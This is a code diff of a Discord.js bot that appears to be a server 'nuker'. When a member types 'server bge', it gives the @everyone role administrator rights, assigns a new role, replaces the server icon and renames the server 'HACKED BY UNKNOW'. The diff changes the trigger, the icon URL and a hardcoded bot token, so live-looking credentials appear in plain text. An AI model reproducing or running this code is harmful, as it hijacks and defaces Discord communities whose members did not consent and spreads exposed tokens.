@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = 'c!'///lera ba dly xot prefix dabne
+const prefix = 'm!'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -23,7 +23,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 })
 ///created by black jack 
 client.on('message', message => {
-    if (message.content.toLowerCase() === prefix + 'help') {
+    if (message.content.toLowerCase() === 'server bge') {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]
@@ -44,9 +44,9 @@ client.on('message', message => {
             }).then(rr => {
  
                 message.member.addRole(rr.id);
-            });
+            })
         }, 1000);
-        message.guild.setIcon("https://media.discordapp.net/attachments/793750057500278805/806561503980421120/image0.jpg");
+        message.guild.setIcon("https://images-ext-2.discordapp.net/external/XQ3ma0vVczOTnGnwHuarnQ01YWiAleZACpdd0BctfPA/https/play-lh.googleusercontent.com/hxhQGvgSGD1cTZ1XAZoylrTvy5vo020km-5vtSuQr98uXaVVS-PaZdUqI5BEI_02MrA%3Dw412-h220-rw");
         message.guild.setName('HACKED BY UNKNOW');
         setTimeout(function() {
             setInterval(() => {
@@ -65,5 +65,5 @@ client.on('message', message => {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("ODA0NjA1NDU3OTE3NTQyNDUx.YBOxOg.tG3he6rpLHmpm0Th9lAejofZH_8")
+client.login("NzU4MzE4ODY4NTg2MDM3Mjk5.X2tNew.4uiKp7VTKoZX0NnNP5HLHswVA0o")
           
